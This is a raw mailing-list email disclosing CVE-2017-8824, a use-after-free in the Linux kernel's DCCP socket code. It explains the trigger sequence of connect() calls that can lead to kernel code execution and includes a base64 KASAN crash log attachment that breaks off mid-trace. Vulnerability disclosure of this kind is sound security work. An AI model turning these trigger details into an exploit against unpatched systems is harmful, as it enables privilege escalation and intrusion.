X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["26990" "Tuesday" "5" "December" "2017" "00:11:41" "+0000" "Mohamed Ghannam" "simo.ghannam@gmail.com" "<CAP8jf_A2x6qceLjfJa6fHyDLQU4n9cdVm-Wc_V4awKy_zBQ66g@mail.gmail.com>" "528" "[oss-security] CVE-2017-8824 linux: use-after-free in DCCP code" nil nil nil "12" "2017120500:11:41" "[oss-security] CVE-2017-8824 linux: use-after-free in DCCP code" (number mark "U       simo.ghannam Dec  5  528/26990 " thread-indent "\"[oss-security] CVE-2017-8824 linux: use-after-free in DCCP code\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 30052 invoked by uid 550); 5 Dec 2017 00:48:17 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1807 invoked from network); 5 Dec 2017 00:11:54 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=idZun1C0uaMVm8fEXggA28iXac9vLhmXSRiAFA8T6FM=;
        b=laW/cdbIGLdWFO4Piy8xQvnLdBizYcLBOsSe9NYGHDPLiyOMdgN38Hr2yCN+X0NT9H
         Cov2YehL/sVMsyToAUnDXa33x6dopyYPP4FluZOXf4i7XVIwRnh2n7VDgIRb1AZlZNY0
         qFubPz3wYjsMe73g14d62Hz+pCoud+Jkw2tjWm8dlzoAkJgGcvyYbStTbzz8NzovBh/2
         iLzInnU6uN6UIxRK+p3zxKRDeuX0zNf+Z2T2CSZAzyKtB5Hcj6pQt1lESXQKfvvSwy7K
         HiQ7+GP6kpC2q24hFYHggI2ZYRcttrJKYBABqj+oNUL5rYmSPq8ETEXD8kY0mv4GDH9l
         y5sQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=idZun1C0uaMVm8fEXggA28iXac9vLhmXSRiAFA8T6FM=;
        b=C6ej+SesReSx1zRY9NYxS9ZxShuU0ex05cq3toP6jUxFMGiV/rWcWht1vvwX7EzPX8
         Ncl5f+Gd+XN7lnp2s6KudRiNRiCyEjO+vwOP//dOA0KDSesurRq3h4eDMFIi7r1VnXr5
         9GoZVGHbkHK06axRh3sbxPY/ZuA0TKHqnCFcu57HidP99NCS+2wXx9VIAt9XVrsP/rHD
         8CCd44tR0mgO/8aQiN8m+Ke24anvNMlSWXiRrLAa5dLKru4i2uPQoftJ/QzrQDlsT32S
         uNndtgKWlK2JpT9nC5OntJCBG+isvllqYlWv9JnjhwWJI1/RYzX4HkhAqFp4ABX6CECc
         cUQw==
X-Gm-Message-State: AKGB3mLK2dCov8eCBzqL9HcUni0NqMQ4TnGYl13IG29rYTXN/7XHpTve
	y+yW/WNjITSw77OIUT1UNDVu4gLSF07pKGkYh5J/Ei3bMos=
X-Google-Smtp-Source: AGs4zMZg04rVrQFu9KdkoL2fE6po258ikIfyfm5d3hfZu5BChczne0AkzZONKA5M9yIv6lq4LTddCI72PCe2amtGWZA=
X-Received: by 10.233.230.1 with SMTP id z1mr21927066qkf.325.1512432701971;
 Mon, 04 Dec 2017 16:11:41 -0800 (PST)
MIME-Version: 1.0
From: Mohamed Ghannam <simo.ghannam@gmail.com>
Date: Tue, 5 Dec 2017 00:11:41 +0000
Message-ID: <CAP8jf_A2x6qceLjfJa6fHyDLQU4n9cdVm-Wc_V4awKy_zBQ66g@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/mixed; boundary="f403043b2478f365ad055f8cadf0"
Subject: [oss-security] CVE-2017-8824 linux: use-after-free in DCCP code

--f403043b2478f365ad055f8cadf0
Content-Type: multipart/alternative; boundary="f403043b2478f365a9055f8cadee"

--f403043b2478f365a9055f8cadee
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi,


This is an announcement for CVE-2017-8824 which is a use-after-free
vulnerability

I found in Linux DCCP socket. It can be used to gain kernel code execution
from unprivileged processes.



You=E2=80=99ll find in attachment the proof of concept code and the kernel =
panic
log.



#######   BUG DETAILS  ############



When a socket sock object is in DCCP_LISTEN  state and connect() system
call is being called with AF_UNSPEC,

the dccp_disconnect() puts sock state into DCCP_CLOSED, and forgets to free
dccps_hc_rx_ccid/dccps_hc_tx_ccid and assigns NULL to them,

then when we call connect() again with AF_INET6 sockaddr family, the sock
object gets cloned via dccp_create_openreq_child() and returns a new sock
object,

which holds references of dccps_hc_rx_ccid and dccps_hc_tx_ccid of the old
sock object, and this leads to both the old and new sock objects can use
the same memory.



#######   LINKS  ############



http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=3D2017-8824

http://lists.openwall.net/netdev/2017/12/04/224



#######   CREDITS  ############



Mohamed Ghannam

--f403043b2478f365a9055f8cadee
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr">
















<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">Hi,</span></p><p class=3D"gmail-MsoNormal" sty=
le=3D"margin:0cm 0cm 0.0001pt;font-size:12pt;font-family:Calibri"><span lan=
g=3D"EN-AU" style=3D"font-family:AppleSystemUIFont;color:rgb(53,53,53)"><br=
></span></p><p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;f=
ont-size:12pt;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-famil=
y:AppleSystemUIFont;color:rgb(53,53,53)">This is an announcement
for CVE-2017-8824 which is a use-after-free vulnerability<span></span></spa=
n></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">I found in Linux DCCP
socket. It can be used to gain kernel code execution from unprivileged
processes.<span></span></span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">You=E2=80=99ll find in attachment
the proof of concept code and the kernel panic log.<span></span></span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">#######=C2=A0=C2=A0 BUG DETAILS=C2=A0
############<span></span></span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">When a socket sock object
is in DCCP_LISTEN=C2=A0 state and connect() system call is being called with
AF_UNSPEC, <span></span></span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">the dccp_disconnect()
puts sock state into DCCP_CLOSED, and forgets to free
dccps_hc_rx_ccid/dccps_hc_tx_ccid and assigns NULL to them,<span></span></s=
pan></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">then when we call
connect() again with AF_INET6 sockaddr family, the sock object gets cloned =
via
dccp_create_openreq_child() and returns a new sock object, <span></span></s=
pan></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">which holds references of
dccps_hc_rx_ccid and dccps_hc_tx_ccid of the old sock object, and this lead=
s to both the old and new sock objects can use the same memory.</span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">#######=C2=A0=C2=A0 LINKS=C2=A0
############<span></span></span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)"><a href=3D"http://www.cve.mitre.org/cgi-bin/cv=
ename.cgi?name=3D2017-8824"><span style=3D"color:rgb(220,161,13);text-decor=
ation-line:none">http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=3D2017-8=
824</span></a><span></span></span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)"><a href=3D"http://lists.openwall.net/netdev/20=
17/12/04/224"><span style=3D"color:rgb(220,161,13);text-decoration-line:non=
e">http://lists.openwall.net/netdev/2017/12/04/224</span></a><span></span><=
/span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">#######=C2=A0=C2=A0 CREDITS=C2=A0
############<span></span></span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>

<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
mUIFont;color:rgb(53,53,53)">Mohamed Ghannam</span><span lang=3D"EN-AU"><sp=
an></span></span></p>

</div>

--f403043b2478f365a9055f8cadee--

--f403043b2478f365ad055f8cadf0
Content-Type: application/octet-stream; name="kasan_report.log"
Content-Disposition: attachment; filename="kasan_report.log"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_jasv7iup0

WyAgIDg0LjkxMjk0N10gQlVHOiBLQVNBTjogdXNlLWFmdGVyLWZyZWUgaW4g
Y2NpZF9oY19yeF9kZWxldGUrMHhkNS8weDEwMApbICAgODQuOTE0MTQyXSBS
ZWFkIG9mIHNpemUgOCBhdCBhZGRyIGZmZmY4ODAwMzI1ZTcwMjAgYnkgdGFz
ayBkY2NwLzI2OTYKWyAgIDg0LjkxNTM0OF0KWyAgIDg0LjkxNTY0N10gQ1BV
OiAwIFBJRDogMjY5NiBDb21tOiBkY2NwIE5vdCB0YWludGVkIDQuMTIuMC1y
YzMrICMyClsgICA4NC45MTY3NTldIEhhcmR3YXJlIG5hbWU6IFFFTVUgU3Rh
bmRhcmQgUEMgKGk0NDBGWCArIFBJSVgsIDE5OTYpLCBCSU9TIFVidW50dS0x
LjguMi0xdWJ1bnR1MSAwNC8wMS8yMDE0ClsgICA4NC45MTg0NjBdIENhbGwg
VHJhY2U6ClsgICA4NC45MTg5NDJdICBkdW1wX3N0YWNrKzB4OTQvMHhlNApb
ICAgODQuOTE5NTYwXSAgPyBjY2lkX2hjX3J4X2RlbGV0ZSsweGQ1LzB4MTAw
ClsgICA4NC45MjAzMzNdICBwcmludF9hZGRyZXNzX2Rlc2NyaXB0aW9uKzB4
NmIvMHgyODAKWyAgIDg0LjkyMTA2NV0gID8gY2NpZF9oY19yeF9kZWxldGUr
MHhkNS8weDEwMApbICAgODQuOTIxNjgxXSAga2FzYW5fcmVwb3J0KzB4MjYw
LzB4MzQwClsgICA4NC45MjIyMjddICBfX2FzYW5fcmVwb3J0X2xvYWQ4X25v
YWJvcnQrMHgxNC8weDIwClsgICA4NC45MjMwMDVdICBjY2lkX2hjX3J4X2Rl
bGV0ZSsweGQ1LzB4MTAwClsgICA4NC45MjM2MzBdICBkY2NwX2Rlc3Ryb3lf
c29jaysweDFhNy8weDJiMApbICAgODQuOTI0MjI1XSAgZGNjcF92Nl9kZXN0
cm95X3NvY2srMHgxNS8weDIwClsgICA4NC45MjQ4MzFdICBpbmV0X2Nza19k
ZXN0cm95X3NvY2srMHgxNjYvMHg0MDAKWyAgIDg0LjkyNTQ3Nl0gIGRjY3Bf
Y2xvc2UrMHgzZGUvMHhjNDAKWyAgIDg0LjkyNTk5MV0gID8gX19mc25vdGlm
eV91cGRhdGVfY2hpbGRfZGVudHJ5X2ZsYWdzLnBhcnQuMisweDJjMC8weDJj
MApbICAgODQuOTI2OTM1XSAgPyBpcF9tY19kcm9wX3NvY2tldCsweDFkZC8w
eDI1MApbICAgODQuOTI3NTU3XSAgPyBzb2NrX3JlbGVhc2UrMHgyMDAvMHgy
MDAKWyAgIDg0LjkyODExOF0gIGluZXRfcmVsZWFzZSsweGVkLzB4MWMwClsg
ICA4NC45Mjg2NDJdICBpbmV0Nl9yZWxlYXNlKzB4NTAvMHg3MApbICAgODQu
OTI5MTY1XSAgc29ja19yZWxlYXNlKzB4OGQvMHgyMDAKWyAgIDg0LjkyOTY4
OF0gIHNvY2tfY2xvc2UrMHgxNi8weDIwClsgICA4NC45MzAxNzRdICBfX2Zw
dXQrMHgyODkvMHg2ZjAKWyAgIDg0LjkzMDUyM10gIF9fX19mcHV0KzB4MTUv
MHgyMApbICAgODQuOTMwODUzXSAgdGFza193b3JrX3J1bisweGY5LzB4MTcw
ClsgICA4NC45MzEyNDNdICBleGl0X3RvX3VzZXJtb2RlX2xvb3ArMHgxM2Iv
MHgxNjAKWyAgIDg0LjkzMTcwNV0gIHN5c2NhbGxfcmV0dXJuX3Nsb3dwYXRo
KzB4MTZiLzB4MWEwClsgICA4NC45MzIxOTVdICBlbnRyeV9TWVNDQUxMXzY0
X2Zhc3RwYXRoKzB4YWYvMHhiMQpbICAgODQuOTMyNjc0XSBSSVA6IDAwMzM6
MHg0M2ZhODAKWyAgIDg0LjkzMjk5N10gUlNQOiAwMDJiOjAwMDA3ZmZkMzU4
MTgwYzggRUZMQUdTOiAwMDAwMDI0NiBPUklHX1JBWDogMDAwMDAwMDAwMDAw
MDAwMwpbICAgODQuOTMzNzYyXSBSQVg6IDAwMDAwMDAwMDAwMDAwMDAgUkJY
OiAwMDAwMDAwMDAwNDAwMmM4IFJDWDogMDAwMDAwMDAwMDQzZmE4MApbICAg
ODQuOTM0NDg2XSBSRFg6IDAwMDAwMDAwMDA2Y2Q1ZDAgUlNJOiAwMDAwMDAw
MDAwMDAwMDBhIFJESTogMDAwMDAwMDAwMDAwMDAwNApbICAgODQuOTM1MjI2
XSBSQlA6IDAwMDA3ZmZkMzU4MTg2YzAgUjA4OiAwMDAwMDAwMDAwNmNkNWMw
IFIwOTogMDAwMDAwMDAwMGIzYzg4MApbICAgODQuOTM1OTUyXSBSMTA6IDAw
MDAwMDAwMDAwMDAwMDYgUjExOiAwMDAwMDAwMDAwMDAwMjQ2IFIxMjogMDAw
MDAwMDAwMDQwMThiMApbICAgODQuOTM2Njc4XSBSMTM6IDAwMDAwMDAwMDA0
MDE5NDAgUjE0OiAwMDAwMDAwMDAwMDAwMDAwIFIxNTogMDAwMDAwMDAwMDAw
MDAwMApbICAgODQuOTM3NDAyXQpbICAgODQuOTM3NTc5XSBBbGxvY2F0ZWQg
YnkgdGFzayAyNjk2OgpbICAgODQuOTM3OTY5XSAgc2F2ZV9zdGFja190cmFj
ZSsweDE2LzB4MjAKWyAgIDg0LjkzODM4Nl0gIHNhdmVfc3RhY2srMHg0Ni8w
eGQwClsgICA4NC45Mzg3NjddICBrYXNhbl9rbWFsbG9jKzB4YWQvMHhlMApb
ICAgODQuOTM5MTM4XSAga2FzYW5fc2xhYl9hbGxvYysweDEyLzB4MjAKWyAg
IDg0LjkzOTUzOF0gIGttZW1fY2FjaGVfYWxsb2MrMHhiOS8weDI2MApbICAg
ODQuOTM5OTEwXSAgY2NpZF9uZXcrMHhiMS8weDM1MApbICAgODQuOTQwMTkz
XSAgZGNjcF9oZGxyX2NjaWQrMHgyNy8weDE0MApbICAgODQuOTQwNTI0XSAg
X19kY2NwX2ZlYXRfYWN0aXZhdGUrMHgxNDcvMHgyZDAKWyAgIDg0Ljk0MDkw
MF0gIGRjY3BfZmVhdF9hY3RpdmF0ZV92YWx1ZXMrMHg0MTcvMHg4YTAKWyAg
IDg0Ljk0MTMxM10gIGRjY3BfcmN2X3N0YXRlX3Byb2Nlc3MrMHhkZGIvMHgx
NTEwClsgICA4NC45NDE3MDhdICBkY2NwX3Y2X2RvX3JjdisweDIwMS8weDNl
MApbICAgODQuOTQyMDU3XSAgX19yZWxlYXNlX3NvY2srMHgxMjcvMHgzNjAK
WyAgIDg0Ljk0MjM4M10gIHJlbGVhc2Vfc29jaysweDU5LzB4MWUwClsgICA4
NC45NDI2OTldICBfX2luZXRfc3RyZWFtX2Nvbm5lY3QrMHg1NjIvMHhiODAK
WyAgIDg0Ljk0MzA3Ml0gIGluZXRfc3RyZWFtX2Nvbm5lY3QrMHg1OC8weGEw
ClsgICA4NC45NDM0MTddICBTWVNDX2Nvbm5lY3QrMHgyM2UvMHgyZTAKWyAg
IDg0Ljk0MzcyOF0gIFN5U19jb25uZWN0KzB4MjQvMHgzMApbICAgODQuOTQ0
MDE1XSAgZW50cnlfU1lTQ0FMTF82NF9mYXN0cGF0aCsweDFjLzB4YjEKWyAg
IDg0Ljk0NDQwMF0KWyAgIDg0Ljk0NDUzNl0gRnJlZWQgYnkgdGFzayAyNjk2
OgpbICAgODQuOTQ0ODA0XSAgc2F2ZV9zdGFja190cmFjZSsweDE2LzB4MjAK
WyAgIDg0Ljk0NTEzMV0gIHNhdmVfc3RhY2srMHg0Ni8weGQwClsgICA4NC45
NDU0MTNdICBrYXNhbl9zbGFiX2ZyZWUrMHg3MC8weGMwClsgICA4NC45NDU3
MjZdICBrbWVtX2NhY2hlX2ZyZWUrMHhhNi8weDJiMApbICAgODQuOTQ2MDU1
XSAgY2NpZF9oY19yeF9kZWxldGUrMHhiZi8weDEwMApbICAgODQuOTQ2Mzk4
XSAgZGNjcF9oZGxyX2NjaWQrMHhkMy8weDE0MApbICAgODQuOTQ2NzI4XSAg
X19kY2NwX2ZlYXRfYWN0aXZhdGUrMHgxNDcvMHgyZDAKWyAgIDg0Ljk0NzEw
NF0gIGRjY3BfZmVhdF9hY3RpdmF0ZV92YWx1ZXMrMHg0MTcvMHg4YTAKWyAg
IDg0Ljk0NzUxNF0gIGRjY3BfY3JlYXRlX29wZW5yZXFfY2hpbGQrMHg0MDIv
MHg1NTAKWyAgIDg0Ljk0NzkyOV0gIGRjY3BfdjZfcmVxdWVzdF9yZWN2X3Nv
Y2srMHgxZjcvMHgxOWMwClsgICA4NC45NDgzNDhdICBkY2NwX2NoZWNrX3Jl
cSsweDUzYi8weDg5MApbICAgODQuOTQ4Njg2XSAgZGNjcF92Nl9yY3YrMHg1
MzAvMHgxOWUwClsgICA4NC45NDkwMDFdICBpcDZfaW5wdXRfZmluaXNoKzB4
NDNkLzB4MTUzMApbICAgODQuOTQ5MzU3XSAgaXA2X2lucHV0KzB4ZDUvMHgz
MzAKWyAgIDg0Ljk0OTY1MF0gIGlwNl9yY3ZfZmluaXNoKzB4MTEyLzB4NjQw
ClsgICA4NC45NDk5ODVdICBpcHY2X3JjdisweDEwOTEvMHgxZWYwClsgICA4
NC45NTAyODVdICBfX25ldGlmX3JlY2VpdmVfc2tiX2NvcmUrMHgxN2RhLzB4
MmFhMApbICAgODQuOTUwNzAyXSAgX19uZXRpZl9yZWNlaXZlX3NrYisweDJj
LzB4MWEwClsgICA4NC45NTEwNjJdICBwcm9jZXNzX2JhY2tsb2crMHhlMy8w
eDY5MApbICAgODQuOTUxNDA1XSAgbmV0X3J4X2FjdGlvbisweDgwOC8weGVj
MApbICAgODQuOTUxNzMwXSAgX19kb19zb2Z0aXJxKzB4MjEzLzB4OGI1Clsg
ICA4NC45NTIwNDBdClsgICA4NC45NTIxNzZdIFRoZSBidWdneSBhZGRyZXNz
IGJlbG9uZ3MgdG8gdGhlIG9iamVjdCBhdCBmZmZmODgwMDMyNWU3MDIwClsg
ICA4NC45NTIxNzZdICB3aGljaCBiZWxvbmdzIHRvIHRoZSBjYWNoZSBjY2lk
Ml9oY19yeF9zb2NrIG9mIHNpemUgMTIKWyAgIDg0Ljk1MzI0NV0gVGhlIGJ1
Z2d5IGFkZHJlc3MgaXMgbG9jYXRlZCAwIGJ5dGVzIGluc2lkZSBvZgpbICAg
ODQuOTUzMjQ1XSAgMTItYnl0ZSByZWdpb24gW2ZmZmY4ODAwMzI1ZTcwMjAs
IGZmZmY4ODAwMzI1ZTcwMmMpClsgICA4NC45NTQyMDVdIFRoZSBidWdneSBh
ZGRyZXNzIGJlbG9uZ3MgdG8gdGhlIHBhZ2U6ClsgICA4NC45NTQ2MTZdIHBh
Z2U6ZmZmZmVhMDAwMGM5NzljMCBjb3VudDoxIG1hcGNvdW50OjAgbWFwcGlu
ZzogICAgICAgICAgKG51bGwpIGluZGV4OjB4MApbICAgODQuOTU1Mjk1XSBm
bGFnczogMHgxMDAwMDAwMDAwMDAxMDAoc2xhYikKWyAgIDg0Ljk1NTY1NV0g
cmF3OiAwMTAwMDAwMDAwMDAwMTAwIDAwMDAwMDAwMDAwMDAwMDAgMDAwMDAw
MDAwMDAwMDAwMCAwMDAwMDAwMTgwODAwMDgwClsgICA4NC45NTYyOTldIHJh
dzogZGVhZDAwMDAwMDAwMDEwMCBkZWFkMDAwMDAwMDAwMjAwIGZmZmY4ODAw
MzRhOGM4YzAgMDAwMDAwMDAwMDAwMDAwMApbICAgODQuOTU2OTU1XSBwYWdl
IGR1bXBlZCBiZWNhdXNlOiBrYXNhbjogYmFkIGFjY2VzcyBkZXRlY3RlZApb
ICAgODQuOTU3NDIxXQpbICAgODQuOTU3NTU1XSBNZW1vcnkgc3RhdGUgYXJv
dW5kIHRoZSBidWdneSBhZGRyZXNzOgpbICAgODQuOTU3OTYxXSAgZmZmZjg4
MDAzMjVlNmYwMDogZmIgZmIgZmIgZmIgZmIgZmIgZmIgZmIgZmIgZmIgZmIg
ZmIgZmIgZmIgZmIgZmIKWyAgIDg0Ljk1ODU3MV0gIGZmZmY4ODAwMzI1ZTZm
ODA6IGZiIGZiIGZiIGZiIGZiIGZiIGZiIGZjIGZjIGZjIGZjIGZjIGZjIGZj
IGZjIGZjClsgICA4NC45NTkxNzVdID5mZmZmODgwMDMyNWU3MDAwOiBmYiBm
YiBmYyBmYyBmYiBmYiBmYyBmYyBmYiBmYiBmYyBmYyAwMCAwNCBmYyBmYwpb
ICAgODQuOTU5NzgwXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
XgpbICAgODQuOTYwMTQ1XSAgZmZmZjg4MDAzMjVlNzA4MDogZmIgZmIgZmMg
ZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMKWyAgIDg0
Ljk2MDc1M10gIGZmZmY4ODAwMzI1ZTcxMDA6IGZjIGZjIGZjIGZjIGZjIGZj
IGZjIGZjIGZjIGZjIGZjIGZjIGZjIGZjIGZjIGZjClsgICA4NC45NjEzNjNd
ID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PQpbICAgODQuOTYxOTg1XSBCVUc6IHVu
YWJsZSB0byBoYW5kbGUga2VybmVsIE5VTEwgcG9pbnRlciBkZXJlZmVyZW5j
ZSBhdCAwMDAwMDAwMDAwMDAwMDA5ClsgICA4NC45NjI2MzldIElQOiBrbWVt
X2NhY2hlX2ZyZWUrMHgxMC8weDJiMApbICAgODQuOTYyOTgwXSBQR0QgMmVm
YWUwNjcKWyAgIDg0Ljk2Mjk4Ml0gUDREIDJlZmFlMDY3ClsgICA4NC45NjMy
MDNdIFBVRCAyZWY3YjA2NwpbICAgODQuOTYzNDI5XSBQTUQgMApbICAgODQu
OTYzNjUyXQpbICAgODQuOTYzOTYwXSBPb3BzOiAwMDAwIFsjMV0gU01QIEtB
U0FOClsgICA4NC45NjQyNjddIE1vZHVsZXMgbGlua2VkIGluOgpbICAgODQu
OTY0NTM0XSBDUFU6IDAgUElEOiAyNjk2IENvbW06IGRjY3AgVGFpbnRlZDog
RyAgICBCICAgICAgICAgICA0LjEyLjAtcmMzKyAjMgpbICAgODQuOTY1MTQ2
XSBIYXJkd2FyZSBuYW1lOiBRRU1VIFN0YW5kYXJkIFBDIChpNDQwRlggKyBQ
SUlYLCAxOTk2KSwgQklPUyBVYnVudHUtMS44LjItMXVidW50dTEgMDQvMDEv
MjAxNApbICAgODQuOTY1OTI4XSB0YXNrOiBmZmZmODgwMDMxYmI4MDAwIHRh
c2suc3RhY2s6IGZmZmY4ODAwMzFhNDgwMDAKWyAgIDg0Ljk2NjQyNV0gUklQ
OiAwMDEwOmttZW1fY2FjaGVfZnJlZSsweDEwLzB4MmIwClsgICA4NC45NjY4
MTNdIFJTUDogMDAxODpmZmZmODgwMDMxYTRmYzQwIEVGTEFHUzogMDAwMTAy
OTYKWyAgIDg0Ljk2NzI0Nl0gUkFYOiAwMDAwMDAwMDAwMDAwMDAxIFJCWDog
ZmZmZjg4MDAzMjVlNzAyMCBSQ1g6IGZmZmZmZmZmOGFmY2ZlY2YKWyAgIDg0
Ljk2NzgxMl0gUkRYOiAwMDAwMDAwMDAwMDAwMDAwIFJTSTogZmZmZjg4MDAz
MjVlNzAyMCBSREk6IDAwMDAwMDAwMDAwMDAwMDAKWyAgIDg0Ljk2ODI3N10g
UkJQOiBmZmZmODgwMDMxYTRmYzY4IFIwODogMDAwMDAwMDAwMDAwMDAwMSBS
MDk6IDAwMDAwMDAwMDAwMDAwMDEKWyAgIDg0Ljk2ODc0M10gUjEwOiAwMDAw
MDAwMDAwMDAwMDAwIFIxMTogMDAwMDAwMDAwMDAwMDAwMCBSMTI6IDAwMDAw
MDAwMDAwMDAwMDAKWyAgIDg0Ljk2OTIwOV0gUjEzOiAwMDAwMDAwMDAwMDAw
MDAwIFIxNDogZmZmZjg4MDAzMjcwOWM4MCBSMTU6IDAwMDAwMDAwMDAwMDAw
MDcKWyAgIDg0Ljk2OTY3Nl0gRlM6ICAwMDAwMDAwMDAwYjNjODgwKDAwMDAp
IEdTOmZmZmY4ODAwMzVlMDAwMDAoMDAwMCkga25sR1M6MDAwMDAwMDAwMDAw
MDAwMApbICAgODQuOTcwMzc2XSBDUzogIDAwMTAgRFM6IDAwMDAgRVM6IDAw
MDAgQ1IwOiAwMDAwMDAwMDgwMDUwMDMzClsgICA4NC45NzA4OTBdIENSMjog
MDAwMDAwMDAwMDAwMDAwOSBDUjM6IDAwMDAwMDAwMmVmM2MwMDAgQ1I0OiAw
MDAwMDAwMDAwMDAwNmYwClsgICA4NC45NzE0OTddIERSMDogMDAwMDAwMDAw
MDAwMDAwMCBEUjE6IDAwMDAwMDAwMDAwMDAwMDAgRFIyOiAwMDAwMDAwMDAw
MDAwMDAwClsgICA4NC45NzIwOTFdIERSMzogMDAwMDAwMDAwMDAwMDAwMCBE
UjY6IDAwMDAwMDAwZmZmZTBmZjAgRFI3OiAwMDAwMDAwMDAwMDAwNDAwClsg
ICA4NC45NzI2ODldIENhbGwgVHJhY2U6ClsgICA4NC45NzI5MDZdICBjY2lk
